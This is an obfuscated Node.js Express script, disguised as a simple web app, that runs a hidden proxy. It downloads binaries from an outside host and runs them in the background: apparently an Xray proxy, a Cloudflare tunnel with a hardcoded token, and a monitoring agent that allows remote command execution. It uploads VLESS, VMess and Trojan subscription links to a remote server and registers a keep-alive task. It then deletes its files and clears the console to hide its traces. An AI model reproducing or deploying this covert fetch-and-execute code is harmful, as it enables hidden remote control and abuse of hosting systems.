const _0x4b3ce1=_0x2a1a;(function(_0x2060d8,_0x5dbe35){const _0x557d8e=_0x2a1a,_0x37e11e=_0x2060d8();while(!![]){try{const _0x46fa5c=parseInt(_0x557d8e(0x261))/0x1+-parseInt(_0x557d8e(0x255))/0x2*(parseInt(_0x557d8e(0x21c))/0x3)+-parseInt(_0x557d8e(0x223))/0x4*(parseInt(_0x557d8e(0x1d4))/0x5)+-parseInt(_0x557d8e(0x26b))/0x6*(parseInt(_0x557d8e(0x214))/0x7)+-parseInt(_0x557d8e(0x20d))/0x8*(-parseInt(_0x557d8e(0x1d1))/0x9)+parseInt(_0x557d8e(0x1f1))/0xa+parseInt(_0x557d8e(0x216))/0xb*(parseInt(_0x557d8e(0x1fb))/0xc);if(_0x46fa5c===_0x5dbe35)break;else _0x37e11e['push'](_0x37e11e['shift']());}catch(_0x25ebb4){_0x37e11e['push'](_0x37e11e['shift']());}}}(_0x68e1,0x8c69d));const express=require(_0x4b3ce1(0x1ff)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x4b3ce1(0x1e5)),exec=promisify(require(_0x4b3ce1(0x1f3))[_0x4b3ce1(0x260)]),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0x4b3ce1(0x1dc)]||'',PROJECT_URL=process[_0x4b3ce1(0x202)][_0x4b3ce1(0x20a)]||'',AUTO_ACCESS=process[_0x4b3ce1(0x202)][_0x4b3ce1(0x23e)]||![],FILE_PATH=process[_0x4b3ce1(0x202)][_0x4b3ce1(0x271)]||'./tmp',SUB_PATH=process[_0x4b3ce1(0x202)][_0x4b3ce1(0x20b)]||_0x4b3ce1(0x263),PORT=process['env'][_0x4b3ce1(0x211)]||process[_0x4b3ce1(0x202)][_0x4b3ce1(0x1d0)]||0xbb8,KAMAN=process[_0x4b3ce1(0x202)]['KAMAN']||_0x4b3ce1(0x245),YOUNGHERO_SERVER=process['env'][_0x4b3ce1(0x259)]||'nzag.faiz.us.kg:8008',YOUNGHERO_PORT=process[_0x4b3ce1(0x202)]['YOUNGHERO_PORT']||'',YOUNGHERO_KEY=process[_0x4b3ce1(0x202)][_0x4b3ce1(0x1cf)]||_0x4b3ce1(0x24c),SUIDAO_DOMAIN=process['env']['SUIDAO_DOMAIN']||_0x4b3ce1(0x268),SUIDAO_AUTH=process[_0x4b3ce1(0x202)][_0x4b3ce1(0x203)]||_0x4b3ce1(0x240),SUIDAO_PORT=process[_0x4b3ce1(0x202)][_0x4b3ce1(0x242)]||0xa3a2,CFIP=process[_0x4b3ce1(0x202)][_0x4b3ce1(0x1e3)]||'cdns.doon.eu.org',CFPORT=process[_0x4b3ce1(0x202)]['CFPORT']||0x1bb,NAME=process[_0x4b3ce1(0x202)][_0x4b3ce1(0x1f9)]||_0x4b3ce1(0x24f);!fs['existsSync'](FILE_PATH)?(fs[_0x4b3ce1(0x218)](FILE_PATH),console[_0x4b3ce1(0x267)](FILE_PATH+_0x4b3ce1(0x233))):console[_0x4b3ce1(0x267)](FILE_PATH+_0x4b3ce1(0x24a));let npmPath=path[_0x4b3ce1(0x224)](FILE_PATH,_0x4b3ce1(0x23d)),phpPath=path[_0x4b3ce1(0x224)](FILE_PATH,_0x4b3ce1(0x1df)),webPath=path[_0x4b3ce1(0x224)](FILE_PATH,_0x4b3ce1(0x1c8)),botPath=path[_0x4b3ce1(0x224)](FILE_PATH,_0x4b3ce1(0x252)),subPath=path['join'](FILE_PATH,_0x4b3ce1(0x1c2)),listPath=path[_0x4b3ce1(0x224)](FILE_PATH,_0x4b3ce1(0x213)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x4b3ce1(0x224)](FILE_PATH,'config.json');function deleteNodes(){const _0x22abd2=_0x4b3ce1;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x525622;try{_0x525622=fs[_0x22abd2(0x220)](subPath,_0x22abd2(0x1ca));}catch{return null;}const _0x528e4b=Buffer[_0x22abd2(0x217)](_0x525622,'base64')[_0x22abd2(0x215)](_0x22abd2(0x1ca)),_0xb43b93=_0x528e4b[_0x22abd2(0x229)]('\x0a')['filter'](_0x2dbc77=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2dbc77));if(_0xb43b93[_0x22abd2(0x256)]===0x0)return;return axios[_0x22abd2(0x273)](UPLOAD_URL+_0x22abd2(0x1fc),JSON['stringify']({'nodes':_0xb43b93}),{'headers':{'Content-Type':'application/json'}})[_0x22abd2(0x262)](_0x565da8=>{return null;});}catch(_0x210f43){return null;}}function cleanupOldFiles(){const _0x483791=_0x4b3ce1,_0x5d3989=['web',_0x483791(0x252),_0x483791(0x23d),_0x483791(0x1df),_0x483791(0x1c2),_0x483791(0x207)];_0x5d3989[_0x483791(0x239)](_0x32bfd5=>{const _0x25176d=_0x483791,_0x49d7ab=path[_0x25176d(0x224)](FILE_PATH,_0x32bfd5);fs[_0x25176d(0x244)](_0x49d7ab,()=>{});});}app[_0x4b3ce1(0x1f0)]('/',function(_0x58c4c3,_0x734727){const _0x507cd4=_0x4b3ce1;_0x734727[_0x507cd4(0x25c)](path[_0x507cd4(0x224)](__dirname,'app.html'));});const config={'log':{'access':'/dev/null','error':_0x4b3ce1(0x1e4),'loglevel':_0x4b3ce1(0x1db)},'inbounds':[{'port':SUIDAO_PORT,'protocol':_0x4b3ce1(0x1c1),'settings':{'clients':[{'id':KAMAN,'flow':_0x4b3ce1(0x22f)}],'decryption':_0x4b3ce1(0x1db),'fallbacks':[{'dest':0xbb9},{'path':_0x4b3ce1(0x257),'dest':0xbba},{'path':_0x4b3ce1(0x206),'dest':0xbbb},{'path':_0x4b3ce1(0x1cc),'dest':0xbbc}]},'streamSettings':{'network':_0x4b3ce1(0x1dd)}},{'port':0xbb9,'listen':_0x4b3ce1(0x1c7),'protocol':'vless','settings':{'clients':[{'id':KAMAN}],'decryption':_0x4b3ce1(0x1db)},'streamSettings':{'network':_0x4b3ce1(0x1dd),'security':_0x4b3ce1(0x1db)}},{'port':0xbba,'listen':_0x4b3ce1(0x1c7),'protocol':_0x4b3ce1(0x1c1),'settings':{'clients':[{'id':KAMAN,'level':0x0}],'decryption':_0x4b3ce1(0x1db)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x4b3ce1(0x257)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4b3ce1(0x22e),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4b3ce1(0x1c7),'protocol':_0x4b3ce1(0x25b),'settings':{'clients':[{'id':KAMAN,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4b3ce1(0x206)}},'sniffing':{'enabled':!![],'destOverride':[_0x4b3ce1(0x20c),_0x4b3ce1(0x22e),_0x4b3ce1(0x1e1)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4b3ce1(0x1c7),'protocol':_0x4b3ce1(0x277),'settings':{'clients':[{'password':KAMAN}]},'streamSettings':{'network':'ws','security':_0x4b3ce1(0x1db),'wsSettings':{'path':'/trojan-suidao'}},'sniffing':{'enabled':!![],'destOverride':[_0x4b3ce1(0x20c),'tls',_0x4b3ce1(0x1e1)],'metadataOnly':![]}}],'dns':{'servers':[_0x4b3ce1(0x1ed)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':'blackhole','tag':_0x4b3ce1(0x1eb)}]};fs['writeFileSync'](path[_0x4b3ce1(0x224)](FILE_PATH,_0x4b3ce1(0x1e6)),JSON[_0x4b3ce1(0x279)](config,null,0x2));function getSystemArchitecture(){const _0x365050=_0x4b3ce1,_0x54128c=os['arch']();return _0x54128c===_0x365050(0x26e)||_0x54128c===_0x365050(0x208)||_0x54128c===_0x365050(0x23b)?'arm':'amd';}function downloadFile(_0x48b1e5,_0x3b853e,_0x5871f5){const _0x539f45=_0x4b3ce1,_0x3640db=path[_0x539f45(0x224)](FILE_PATH,_0x48b1e5),_0x2b5964=fs['createWriteStream'](_0x3640db);axios({'method':_0x539f45(0x1f0),'url':_0x3b853e,'responseType':_0x539f45(0x1e0)})['then'](_0x3a4ecf=>{const _0x1a7c75=_0x539f45;_0x3a4ecf[_0x1a7c75(0x25f)]['pipe'](_0x2b5964),_0x2b5964['on'](_0x1a7c75(0x1f5),()=>{const _0x5e359b=_0x1a7c75;_0x2b5964[_0x5e359b(0x1cb)](),console[_0x5e359b(0x267)](_0x5e359b(0x1da)+_0x48b1e5+'\x20successfully'),_0x5871f5(null,_0x48b1e5);}),_0x2b5964['on'](_0x1a7c75(0x1f6),_0x3cae33=>{const _0x481c32=_0x1a7c75;fs[_0x481c32(0x244)](_0x3640db,()=>{});const _0x2cc90f=_0x481c32(0x1da)+_0x48b1e5+_0x481c32(0x1ec)+_0x3cae33['message'];console[_0x481c32(0x1f6)](_0x2cc90f),_0x5871f5(_0x2cc90f);});})['catch'](_0x22ea73=>{const _0x370bdd=_0x539f45,_0x5b565e='Download\x20'+_0x48b1e5+_0x370bdd(0x1ec)+_0x22ea73[_0x370bdd(0x21b)];console[_0x370bdd(0x1f6)](_0x5b565e),_0x5871f5(_0x5b565e);});}async function downloadFilesAndRun(){const _0x118aaa=_0x4b3ce1,_0x102de9=getSystemArchitecture(),_0x13c37d=getFilesForArchitecture(_0x102de9);if(_0x13c37d[_0x118aaa(0x256)]===0x0){console[_0x118aaa(0x267)](_0x118aaa(0x270));return;}const _0x208773=_0x13c37d[_0x118aaa(0x1d3)](_0x39017d=>{return new Promise((_0x2975f4,_0xeaa764)=>{const _0x370d56=_0x2a1a;downloadFile(_0x39017d[_0x370d56(0x1c6)],_0x39017d['fileUrl'],(_0x24ccae,_0x1b1fb1)=>{_0x24ccae?_0xeaa764(_0x24ccae):_0x2975f4(_0x1b1fb1);});});});try{await Promise[_0x118aaa(0x1bf)](_0x208773);}catch(_0x4d9877){console[_0x118aaa(0x1f6)](_0x118aaa(0x209),_0x4d9877);return;}function _0x43156e(_0x2d5f70){const _0x575e92=_0x118aaa,_0x1cf7ec=0x1fd;_0x2d5f70[_0x575e92(0x239)](_0x28e66f=>{const _0x286b0f=_0x575e92,_0x5afa7d=path['join'](FILE_PATH,_0x28e66f);fs[_0x286b0f(0x258)](_0x5afa7d)&&fs[_0x286b0f(0x20e)](_0x5afa7d,_0x1cf7ec,_0xe2e456=>{const _0x29cee5=_0x286b0f;_0xe2e456?console[_0x29cee5(0x1f6)](_0x29cee5(0x1ef)+_0x5afa7d+':\x20'+_0xe2e456):console[_0x29cee5(0x267)](_0x29cee5(0x1ce)+_0x5afa7d+':\x20'+_0x1cf7ec['toString'](0x8));});});}const _0x163fb4=YOUNGHERO_PORT?[_0x118aaa(0x251),'./web','./bot']:[_0x118aaa(0x237),_0x118aaa(0x1ea),'./bot'];_0x43156e(_0x163fb4);if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(!YOUNGHERO_PORT){const _0x4fbc90=YOUNGHERO_SERVER['includes'](':')?YOUNGHERO_SERVER[_0x118aaa(0x229)](':')[_0x118aaa(0x1c3)]():'',_0xe3da75=new Set([_0x118aaa(0x210),_0x118aaa(0x201),_0x118aaa(0x1e2),_0x118aaa(0x235),'2083',_0x118aaa(0x1d7)]),_0x1729ed=_0xe3da75[_0x118aaa(0x23f)](_0x4fbc90)?_0x118aaa(0x1c9):_0x118aaa(0x1ee),_0xad18=_0x118aaa(0x1d6)+YOUNGHERO_KEY+_0x118aaa(0x20f)+YOUNGHERO_SERVER+_0x118aaa(0x22a)+_0x1729ed+_0x118aaa(0x247)+KAMAN;fs[_0x118aaa(0x234)](path[_0x118aaa(0x224)](FILE_PATH,'config.yaml'),_0xad18);const _0x215bda='nohup\x20'+FILE_PATH+_0x118aaa(0x23c)+FILE_PATH+_0x118aaa(0x25e);try{await exec(_0x215bda),console[_0x118aaa(0x267)](_0x118aaa(0x226)),await new Promise(_0x2b7573=>setTimeout(_0x2b7573,0x3e8));}catch(_0x233999){console[_0x118aaa(0x1f6)](_0x118aaa(0x1f2)+_0x233999);}}else{let _0x32d53b='';const _0x3f58cc=[_0x118aaa(0x210),_0x118aaa(0x201),'2096',_0x118aaa(0x235),_0x118aaa(0x1e8),_0x118aaa(0x1d7)];_0x3f58cc[_0x118aaa(0x241)](YOUNGHERO_PORT)&&(_0x32d53b='--tls');const _0x47ee06=_0x118aaa(0x238)+FILE_PATH+_0x118aaa(0x1d2)+YOUNGHERO_SERVER+':'+YOUNGHERO_PORT+_0x118aaa(0x24d)+YOUNGHERO_KEY+'\x20'+_0x32d53b+_0x118aaa(0x212);try{await exec(_0x47ee06),console[_0x118aaa(0x267)](_0x118aaa(0x200)),await new Promise(_0x259f25=>setTimeout(_0x259f25,0x3e8));}catch(_0x95c18d){console[_0x118aaa(0x1f6)](_0x118aaa(0x248)+_0x95c18d);}}}else console['log'](_0x118aaa(0x225));const _0x5c99b3=_0x118aaa(0x238)+FILE_PATH+_0x118aaa(0x24b)+FILE_PATH+_0x118aaa(0x221);try{await exec(_0x5c99b3),console[_0x118aaa(0x267)](_0x118aaa(0x272)),await new Promise(_0x274e4b=>setTimeout(_0x274e4b,0x3e8));}catch(_0x1dbbdf){console[_0x118aaa(0x1f6)](_0x118aaa(0x21e)+_0x1dbbdf);}if(fs[_0x118aaa(0x258)](path[_0x118aaa(0x224)](FILE_PATH,'bot'))){let _0x32eca4;if(SUIDAO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x32eca4='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+SUIDAO_AUTH;else SUIDAO_AUTH[_0x118aaa(0x276)](/TunnelSecret/)?_0x32eca4=_0x118aaa(0x1fe)+FILE_PATH+'/tunnel.yml\x20run':_0x32eca4=_0x118aaa(0x219)+FILE_PATH+_0x118aaa(0x22d)+SUIDAO_PORT;try{await exec(_0x118aaa(0x238)+FILE_PATH+'/bot\x20'+_0x32eca4+'\x20>/dev/null\x202>&1\x20&'),console[_0x118aaa(0x267)](_0x118aaa(0x275)),await new Promise(_0x5744ba=>setTimeout(_0x5744ba,0x7d0));}catch(_0x266555){console['error'](_0x118aaa(0x1f7)+_0x266555);}}await new Promise(_0x9b9a42=>setTimeout(_0x9b9a42,0x1388));}function getFilesForArchitecture(_0x86bdf0){const _0x912add=_0x4b3ce1;let _0x4a38a6;_0x86bdf0===_0x912add(0x26e)?_0x4a38a6=[{'fileName':_0x912add(0x1c8),'fileUrl':_0x912add(0x205)},{'fileName':_0x912add(0x252),'fileUrl':_0x912add(0x236)}]:_0x4a38a6=[{'fileName':'web','fileUrl':_0x912add(0x1c0)},{'fileName':_0x912add(0x252),'fileUrl':_0x912add(0x269)}];if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(YOUNGHERO_PORT){const _0x4ce9e8=_0x86bdf0===_0x912add(0x26e)?_0x912add(0x24e):_0x912add(0x227);_0x4a38a6[_0x912add(0x26a)]({'fileName':_0x912add(0x23d),'fileUrl':_0x4ce9e8});}else{const _0x3a7e15=_0x86bdf0===_0x912add(0x26e)?_0x912add(0x26c):_0x912add(0x1d5);_0x4a38a6[_0x912add(0x26a)]({'fileName':_0x912add(0x1df),'fileUrl':_0x3a7e15});}}return _0x4a38a6;}function suidaoType(){const _0x4c85e2=_0x4b3ce1;if(!SUIDAO_AUTH||!SUIDAO_DOMAIN){console[_0x4c85e2(0x267)]('SUIDAO_DOMAIN\x20or\x20SUIDAO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(SUIDAO_AUTH[_0x4c85e2(0x241)](_0x4c85e2(0x228))){fs[_0x4c85e2(0x234)](path[_0x4c85e2(0x224)](FILE_PATH,'tunnel.json'),SUIDAO_AUTH);const _0x4681e5=_0x4c85e2(0x1e7)+SUIDAO_AUTH['split']('\x22')[0xb]+_0x4c85e2(0x265)+path[_0x4c85e2(0x224)](FILE_PATH,_0x4c85e2(0x232))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+SUIDAO_DOMAIN+_0x4c85e2(0x1c4)+SUIDAO_PORT+_0x4c85e2(0x22c);fs[_0x4c85e2(0x234)](path['join'](FILE_PATH,'tunnel.yml'),_0x4681e5);}else console['log']('SUIDAO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}suidaoType();function _0x68e1(){const _0x46bef1=['6sVLFJG','\x0a\x20\x20\x0atrojan://','web\x20running\x20error:\x20','rm\x20-rf\x20','readFileSync','/config.json\x20>/dev/null\x202>&1\x20&','\x20>/dev/null\x202>&1','148eKioId','join','YOUNGHERO\x20variable\x20is\x20empty,skip\x20running','php\x20is\x20running','https://amd64.ssss.nyc.mn/agent','TunnelSecret','split','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','set','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','tls','xtls-rprx-vision','status','base64','tunnel.json','\x20is\x20created','writeFileSync','2087','https://arm64.ssss.nyc.mn/2go','./php','nohup\x20','forEach','Error\x20reading\x20boot.log:','aarch64','/php\x20-c\x20\x22','npm','AUTO_ACCESS','has','eyJhIjoiNmI3MzZhMDhiMzlmNDVlMzE2ZTdlMGNkODE2Yjc2ZDIiLCJ0IjoiOWM5MDU1YmYtODJkNy00NWM0LWI0ZjAtZmY0Y2JiNjBmM2ZiIiwicyI6Ik5qSXdPRGd6WlRZdE4yVTJOaTAwWVdWa0xXSmlOamt0Tm1ReE5qRXlORFk1TkRreCJ9','includes','SUIDAO_PORT','添加URL失败:\x20','unlink','22d73127-cc6a-4163-8081-2cafd693828c','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','npm\x20running\x20error:\x20','&path=%2Fvless-suidao%3Fed%3D2560#','\x20already\x20exists','/web\x20-c\x20','JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl','\x20-p\x20','https://arm64.ssss.nyc.mn/agent','Vls','Skipping\x20adding\x20automatic\x20access\x20task','./npm','bot','SUIDAO_DOMAIN:','/api/add-nodes','674836nPgtKF','length','/vless-suidao','existsSync','YOUNGHERO_SERVER','text/plain;\x20charset=utf-8','vmess','sendFile','\x0a\x20\x20\x0avmess://','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','data','exec','248438qFAiZZ','catch','leaflow','Content-Type','\x0a\x20\x20credentials-file:\x20','push','log','leaflow.kaixa.xx.kg','https://amd64.ssss.nyc.mn/2go','unshift','482316HlfSJy','https://arm64.ssss.nyc.mn/v1','SuidaoDomain:','arm','&path=%2Ftrojan-suidao%3Fed%3D2560#','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','FILE_PATH','web\x20is\x20running','post','application/json','bot\x20is\x20running','match','trojan','listen','stringify','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','all','https://amd64.ssss.nyc.mn/web','vless','sub.txt','pop','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','?encryption=none&security=tls&sni=','fileName','127.0.0.1','web','true','utf-8','close','/trojan-suidao','automatic\x20access\x20task\x20added\x20successfully','Empowerment\x20success\x20for\x20','YOUNGHERO_KEY','PORT','1341dQXYeN','/npm\x20-s\x20','map','66380dSVmuX','https://amd64.ssss.nyc.mn/v1','\x0aclient_secret:\x20','2053','App\x20is\x20running','&type=ws&host=','Download\x20','none','UPLOAD_URL','tcp','Subscription\x20uploaded\x20successfully','php','stream','quic','2096','CFIP','/dev/null','util','config.json','\x0a\x20\x20tunnel:\x20','2083','/sub.txt\x20saved\x20successfully','./web','block','\x20failed:\x20','https+local://8.8.8.8/dns-query','false','Empowerment\x20failed\x20for\x20','get','4561730UcjAtp','php\x20running\x20error:\x20','child_process','http\x20server\x20is\x20running\x20on\x20port:','finish','error','Error\x20executing\x20command:\x20','response','NAME','/vmess-suidao?ed=2560','127920TFzcKQ','/api/delete-nodes','\x0avless://','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','express','npm\x20is\x20running','8443','env','SUIDAO_AUTH','send','https://arm64.ssss.nyc.mn/web','/vmess-suidao','boot.log','arm64','Error\x20downloading\x20files:','PROJECT_URL','SUB_PATH','http','25648aPlLgf','chmod','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','443','SERVER_PORT','\x20>/dev/null\x202>&1\x20&','list.txt','98PXqPKU','toString','1738liRZNy','from','mkdirSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','?security=tls&sni=','message'];_0x68e1=function(){return _0x46bef1;};return _0x68e1();}async function extractDomains(){const _0x59f0dc=_0x4b3ce1;let _0x4f450f;if(SUIDAO_AUTH&&SUIDAO_DOMAIN)_0x4f450f=SUIDAO_DOMAIN,console['log'](_0x59f0dc(0x253),_0x4f450f),await _0x1045bc(_0x4f450f);else try{const _0x4aba49=fs['readFileSync'](path[_0x59f0dc(0x224)](FILE_PATH,'boot.log'),_0x59f0dc(0x1ca)),_0x5ad9a8=_0x4aba49[_0x59f0dc(0x229)]('\x0a'),_0x488a6d=[];_0x5ad9a8[_0x59f0dc(0x239)](_0x2fb5a3=>{const _0x3d148c=_0x59f0dc,_0x23d6eb=_0x2fb5a3[_0x3d148c(0x276)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x23d6eb){const _0x1d356f=_0x23d6eb[0x1];_0x488a6d['push'](_0x1d356f);}});if(_0x488a6d['length']>0x0)_0x4f450f=_0x488a6d[0x0],console[_0x59f0dc(0x267)](_0x59f0dc(0x26d),_0x4f450f),await _0x1045bc(_0x4f450f);else{console[_0x59f0dc(0x267)]('SuidaoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20SuidaoDomain'),fs['unlinkSync'](path[_0x59f0dc(0x224)](FILE_PATH,_0x59f0dc(0x207)));async function _0x3d79f2(){const _0x49f6c5=_0x59f0dc;try{await exec(_0x49f6c5(0x1be));}catch(_0xc27c68){}}_0x3d79f2(),await new Promise(_0x2a0bd8=>setTimeout(_0x2a0bd8,0xbb8));const _0x421504=_0x59f0dc(0x219)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+SUIDAO_PORT;try{await exec(_0x59f0dc(0x238)+path[_0x59f0dc(0x224)](FILE_PATH,'bot')+'\x20'+_0x421504+'\x20>/dev/null\x202>&1\x20&'),console[_0x59f0dc(0x267)]('bot\x20is\x20running.'),await new Promise(_0x1a4de9=>setTimeout(_0x1a4de9,0xbb8)),await extractDomains();}catch(_0x3e93ae){console[_0x59f0dc(0x1f6)]('Error\x20executing\x20command:\x20'+_0x3e93ae);}}}catch(_0x573efd){console[_0x59f0dc(0x1f6)](_0x59f0dc(0x23a),_0x573efd);}async function _0x1045bc(_0x56fb87){const _0x13bfd=_0x59f0dc,_0x4a86fd=execSync(_0x13bfd(0x246),{'encoding':_0x13bfd(0x1ca)}),_0x5e001b=_0x4a86fd['trim']();return new Promise(_0x5b9e8b=>{setTimeout(()=>{const _0x38520b=_0x2a1a,_0x540467={'v':'2','ps':NAME+'-'+_0x5e001b,'add':CFIP,'port':CFPORT,'id':KAMAN,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x56fb87,'path':_0x38520b(0x1fa),'tls':_0x38520b(0x22e),'sni':_0x56fb87,'alpn':''},_0xa8df25=_0x38520b(0x1fd)+KAMAN+'@'+CFIP+':'+CFPORT+_0x38520b(0x1c5)+_0x56fb87+_0x38520b(0x1d9)+_0x56fb87+_0x38520b(0x249)+NAME+'-'+_0x5e001b+_0x38520b(0x25d)+Buffer[_0x38520b(0x217)](JSON[_0x38520b(0x279)](_0x540467))[_0x38520b(0x215)](_0x38520b(0x231))+_0x38520b(0x21d)+KAMAN+'@'+CFIP+':'+CFPORT+_0x38520b(0x21a)+_0x56fb87+'&type=ws&host='+_0x56fb87+_0x38520b(0x26f)+NAME+'-'+_0x5e001b+'\x0a\x20\x20\x20\x20';console[_0x38520b(0x267)](Buffer[_0x38520b(0x217)](_0xa8df25)['toString'](_0x38520b(0x231))),fs[_0x38520b(0x234)](subPath,Buffer[_0x38520b(0x217)](_0xa8df25)[_0x38520b(0x215)](_0x38520b(0x231))),console[_0x38520b(0x267)](FILE_PATH+_0x38520b(0x1e9)),uplodNodes(),app['get']('/'+SUB_PATH,(_0x437d58,_0x43f35d)=>{const _0x52bebe=_0x38520b,_0x229c34=Buffer['from'](_0xa8df25)[_0x52bebe(0x215)](_0x52bebe(0x231));_0x43f35d[_0x52bebe(0x22b)](_0x52bebe(0x264),_0x52bebe(0x25a)),_0x43f35d[_0x52bebe(0x204)](_0x229c34);}),_0x5b9e8b(_0xa8df25);},0x7d0);});}}function _0x2a1a(_0x355b6b,_0x463e2e){const _0x68e10d=_0x68e1();return _0x2a1a=function(_0x2a1ae8,_0x2c9ec8){_0x2a1ae8=_0x2a1ae8-0x1be;let _0x510ddf=_0x68e10d[_0x2a1ae8];return _0x510ddf;},_0x2a1a(_0x355b6b,_0x463e2e);}async function uplodNodes(){const _0x6bcf16=_0x4b3ce1;if(UPLOAD_URL&&PROJECT_URL){const _0x123550=PROJECT_URL+'/'+SUB_PATH,_0x51dcbb={'subscription':[_0x123550]};try{const _0x4ece41=await axios[_0x6bcf16(0x273)](UPLOAD_URL+'/api/add-subscriptions',_0x51dcbb,{'headers':{'Content-Type':_0x6bcf16(0x274)}});if(_0x4ece41[_0x6bcf16(0x230)]===0xc8)console[_0x6bcf16(0x267)](_0x6bcf16(0x1de));else return null;}catch(_0x561261){if(_0x561261['response']){if(_0x561261[_0x6bcf16(0x1f8)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x6bcf16(0x258)](listPath))return;const _0xa6fb1e=fs['readFileSync'](listPath,_0x6bcf16(0x1ca)),_0x727334=_0xa6fb1e[_0x6bcf16(0x229)]('\x0a')['filter'](_0x21ba97=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x21ba97));if(_0x727334[_0x6bcf16(0x256)]===0x0)return;const _0x314abb=JSON[_0x6bcf16(0x279)]({'nodes':_0x727334});try{await axios[_0x6bcf16(0x273)](UPLOAD_URL+_0x6bcf16(0x254),_0x314abb,{'headers':{'Content-Type':_0x6bcf16(0x274)}});if(response[_0x6bcf16(0x230)]===0xc8)console['log']('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x525bd2){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4b84ec=_0x2a1a,_0x20de27=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(YOUNGHERO_PORT)_0x20de27[_0x4b84ec(0x266)](npmPath);else YOUNGHERO_SERVER&&YOUNGHERO_KEY&&_0x20de27[_0x4b84ec(0x266)](phpPath);exec(_0x4b84ec(0x21f)+_0x20de27[_0x4b84ec(0x224)]('\x20')+_0x4b84ec(0x222),_0x442cc6=>{const _0x32f653=_0x4b84ec;console['clear'](),console[_0x32f653(0x267)](_0x32f653(0x1d8)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4f2201=_0x4b3ce1;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x4f2201(0x250));return;}try{const _0x51a45f=await axios[_0x4f2201(0x273)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4f2201(0x274)}});console[_0x4f2201(0x267)](_0x4f2201(0x1cd));}catch(_0x5d3aaf){console[_0x4f2201(0x1f6)](_0x4f2201(0x243)+_0x5d3aaf['message']);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x4b3ce1(0x278)](PORT,()=>console[_0x4b3ce1(0x267)](_0x4b3ce1(0x1f4)+PORT+'!'));
